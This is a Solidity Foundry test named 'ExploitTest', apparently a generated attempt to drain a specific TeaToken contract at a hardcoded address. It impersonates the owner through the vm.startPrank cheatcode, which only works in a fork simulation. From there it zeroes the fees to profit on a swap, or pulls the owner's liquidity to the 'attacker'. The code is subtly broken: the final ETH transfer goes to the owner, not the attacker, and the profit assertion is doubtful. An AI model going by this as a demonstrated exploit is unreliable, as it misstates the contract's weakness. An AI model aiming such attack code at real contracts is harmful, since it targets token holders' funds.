pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for TeaToken with needed functions
interface ITeaToken {
    function owner() external view returns (address);
    function excludeFromFee(address account) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function totalSupply() external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function setTaxFeePercent(uint256) external;
    function setLiquidityFeePercent(uint256) external;
}

// ERC20 interface for LP token
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Extended router interface
interface IPancakeRouter {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address teaOwner = ITeaToken(TARGET).owner();

        // Step 2: Get pair address
        address pair = ITeaToken(TARGET).uniswapV2Pair();

        // Step 3: Get owner's LP token balance
        uint256 ownerLPBalance = IERC20(pair).balanceOf(teaOwner);

        // If owner has no LP tokens, we need a different approach
        if (ownerLPBalance == 0) {
            // Alternative: set fees to 0 and trade
            vm.startPrank(teaOwner);
            ITeaToken(TARGET).setTaxFeePercent(0);
            ITeaToken(TARGET).setLiquidityFeePercent(0);
            ITeaToken(TARGET).excludeFromFee(attacker);
            vm.stopPrank();

            // Buy some tokens first (need ETH)
            deal(attacker, 10 ether); // Give attacker some ETH

            address routerAddress = ITeaToken(TARGET).uniswapV2Router();
            IPancakeRouter router = IPancakeRouter(routerAddress);

            address[] memory path = new address[](2);
            path[0] = router.WETH();
            path[1] = TARGET;

            // Buy tokens
            router.swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 1 ether
            }(
                0,
                path,
                attacker,
                block.timestamp
            );

            // Sell tokens back (should get more ETH since no fees)
            uint256 tokenBalance = ITeaToken(TARGET).balanceOf(attacker);
            ITeaToken(TARGET).approve(routerAddress, tokenBalance);

            path[0] = TARGET;
            path[1] = router.WETH();

            uint256 ethBefore = address(attacker).balance;

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance,
                0,
                path,
                attacker,
                block.timestamp
            );

            uint256 ethAfter = address(attacker).balance;
            assertGt(ethAfter, ethBefore, "ETH balance should increase");
        } else {
            // Owner has LP tokens - withdraw them
            vm.startPrank(teaOwner);

            address routerAddress = ITeaToken(TARGET).uniswapV2Router();
            IPancakeRouter router = IPancakeRouter(routerAddress);

            // Approve router to spend LP tokens
            IERC20(pair).approve(routerAddress, ownerLPBalance);

            // Remove liquidity
            uint256 ethBefore = address(teaOwner).balance;

            router.removeLiquidityETHSupportingFeeOnTransferTokens(
                TARGET,
                ownerLPBalance,
                0, // min amount of token
                0, // min amount of ETH
                teaOwner,
                block.timestamp
            );

            uint256 ethAfter = address(teaOwner).balance;

            // Now transfer ETH from owner to attacker
            (bool success, ) = teaOwner.call{value: ethAfter - ethBefore}("");
            require(success, "Transfer failed");

            vm.stopPrank();

            // Verify attacker got ETH
            assertGt(address(attacker).balance, 0, "Attacker should have ETH");
        }
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

